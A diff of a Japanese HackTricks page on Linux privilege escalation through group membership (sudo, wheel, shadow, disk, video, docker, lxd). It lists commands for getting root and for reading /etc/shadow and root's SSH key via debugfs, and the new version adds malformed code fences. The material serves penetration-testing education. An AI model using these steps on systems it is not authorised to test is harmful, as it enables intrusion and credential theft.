@@ -1,25 +1,23 @@
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>
 
-- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** または、**PEASSの最新バージョンにアクセスしたいですか？** または、**HackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricksをサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
+* **HackTricksにあなたの会社を広告したい場合**、または**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
+* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有してください。
 
 </details>
 
 
-# Sudo/Admin グループ
+# Sudo/Adminグループ
 
-## **PE - 方法1**
+## **PE - 方法 1**
 
-**時には**、**デフォルトで（または一部のソフトウェアが必要とするために）** **/etc/sudoers** ファイルの中に、次のような行があることがあります：
+**時々**、**デフォルトで\(またはあるソフトウェアが必要とするために\)** **/etc/sudoers** ファイル内に以下のような行が見つかることがあります：
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -27,36 +25,40 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-これは、**sudoまたはadminグループに所属するユーザーはsudoとして何でも実行できる**ことを意味します。
+これは、**sudo グループまたは admin グループに属する任意のユーザーが、sudo として何でも実行できる**ことを意味します。
 
-もし状況がそうであるなら、**rootになるためには単に以下を実行するだけです**:
+この場合、**root になるには、次のコマンドを実行するだけです**：
 ```text
 sudo su
 ```
-## PE - メソッド2
+## PE - 方法 2
 
-すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します：
+すべてのsuidバイナリを見つけ、**Pkexec**バイナリがあるか確認します：
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-もし、バイナリファイルpkexecがSUIDバイナリであり、sudoまたはadminに所属している場合、おそらくpkexecを使用してバイナリをsudoとして実行できるでしょう。
-以下の内容を確認してください：
+```markdown
+もしバイナリpkexecがSUIDバイナリであり、あなたがsudoまたはadminグループに属している場合、pkexecを使用してsudoとしてバイナリを実行できる可能性があります。
+以下の内容を確認してください:
+```
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-以下では、どのグループが**pkexec**を実行することが許可されているか、および一部のLinuxではデフォルトで**sudo**または**admin**のいずれかのグループが表示されることがあります。
+```markdown
+以下に、どのグループが**pkexec**を実行できるか、また**デフォルトでは**一部のLinuxでは**sudoまたはadmin**グループが**表示される**ことがあります。
 
-**rootになるためには、次のコマンドを実行します**:
+**rootになるには以下を実行します**:
+```
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-もし**pkexec**を実行しようとして、以下の**エラー**が表示された場合:
+実行しようとしたときに**pkexec**がこの**エラー**を出した場合：
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**権限がないわけではなく、GUIなしで接続されていないためです**。この問題の回避策はこちらにあります：[https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です：
+**権限がないからではなく、GUIなしで接続していないからです**。この問題に対する回避策はこちらにあります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:
 
 {% code title="session1" %}
 ```bash
@@ -64,34 +66,40 @@ echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
 #Step 5, if correctly authenticate, you will have a root session
 ```
+```
+{% endcode %}
+
 {% code title="session2" %}
+```
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 {% endcode %}
 
-# Wheelグループ
+# Wheel Group
 
-**時々**、**デフォルトで**、**/etc/sudoers**ファイルの中にこの行が見つかることがあります:
+**時々**、**デフォルトで** **/etc/sudoers** ファイル内にこの行が見つかることがあります：
 ```text
 %wheel	ALL=(ALL:ALL) ALL
 ```
-これは、**wheelグループに所属するユーザーはsudoとして何でも実行できる**ことを意味します。
+これは、**wheel グループに属する任意のユーザーが sudo として何でも実行できる**ことを意味します。
 
-もし上記が当てはまる場合、**rootになるためには単に以下を実行するだけです**:
+この場合、**root になるためには次のコマンドを実行するだけです**：
 ```text
 sudo su
 ```
-# シャドウグループ
+# Shadow グループ
 
-**シャドウグループ**のユーザーは、**/etc/shadow** ファイルを**読み取る**ことができます。
+**group shadow** に属するユーザーは **/etc/shadow** ファイルを**読む**ことができます：
 ```text
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-# ディスクグループ
+ファイルを読んで、**ハッシュをクラック**してみてください。
 
-この特権は、マシン内のすべてのデータにアクセスできるため、ほぼルートアクセスと同等です。
+# Disk Group
+
+この権限は、マシン内のすべてのデータにアクセスできるため、ほぼ**rootアクセスと同等です**。
 
 ファイル：`/dev/sd[a-z][1-9]`
 ```text
@@ -101,16 +109,20 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-注意してください、debugfsを使用すると**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします：
+```markdown
+debugfsを使用すると、**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、以下のようにします:
+```
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-しかし、rootが所有するファイル（`/etc/shadow`や`/etc/passwd`など）を書き込もうとすると、「**Permission denied**」のエラーが発生します。
+```
+しかし、**rootが所有するファイルに書き込もうとする** \(例えば `/etc/shadow` や `/etc/passwd`\) と "**Permission denied**" エラーが表示されます。
 
 # Video Group
 
-コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、以下のような出力が表示されます：
+`w` コマンドを使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます:
+```
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
@@ -118,53 +130,51 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**は、ユーザー**yossiが物理的に**マシンの端末にログインしていることを意味します。
 
-**videoグループ**は、画面出力を表示する権限を持っています。基本的に、画面を観察することができます。これを行うには、現在の画面のイメージを生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存され、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
+**videoグループ**は画面出力を見る権限があります。基本的には画面を観察することができます。それを行うには、画面上の現在の画像を生データで**取得し**、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-**生のイメージ**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**生のイメージデータ**を選択します：
+**raw画像**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：
 
 ![](../../.gitbook/assets/image%20%28208%29.png)
 
-次に、画面で使用されている幅と高さを変更し、さまざまなイメージタイプを確認します（画面をより良く表示するものを選択します）：
+次に、画面で使用されている幅と高さを変更し、異なる画像タイプを確認します（画面をより良く表示するものを選択します）：
 
 ![](../../.gitbook/assets/image%20%28295%29.png)
 
-# ルートグループ
+# Root Group
 
-デフォルトでは、**ルートグループのメンバー**は、特権をエスカレートするために使用できる**一部のサービス**の設定ファイルや**ライブラリ**ファイルなど、**他の興味深いもの**を変更することができるようです...
+デフォルトでは、**rootグループのメンバー**は、**サービス**の設定ファイルやいくつかの**ライブラリ**ファイル、または**他の興味深いもの**を**変更**できる可能性があるようです。これらは権限の昇格に使用できるかもしれません...
 
-**ルートメンバーが変更できるファイルを確認します**：
+**rootメンバーが変更できるファイルを確認してください**：
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-# Dockerグループ
+# Docker グループ
 
-ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントすることができます。そのため、インスタンスが起動するとすぐにそのボリュームに`chroot`がロードされます。これにより、実質的にマシン上でroot権限を取得することができます。
+ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。そのため、インスタンスが起動するとすぐにそのボリュームに `chroot` をロードします。これにより、実質的にマシンの root 権限を得ることができます。
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-# lxc/lxdグループ
+# lxc/lxd グループ
 
-[lxc - 特権エスカレーション](lxd-privilege-escalation.md)
+[lxc - 権限昇格](lxd-privilege-escalation.md)
 
 
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWS ハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
 
-- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+HackTricks をサポートする他の方法:
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-
-- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- **[💬](https://emojipedia.org/speech-balloon/) Discordグループ**または**Telegramグループ**に**参加**するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。
+* **HackTricks にあなたの会社を広告したい**、または **HackTricks を PDF でダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式 PEASS & HackTricks グッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションをチェックする
+* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegram グループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を **フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の github リポジトリに PR を提出して、あなたのハッキングのコツを **共有する**。
 
 </details>
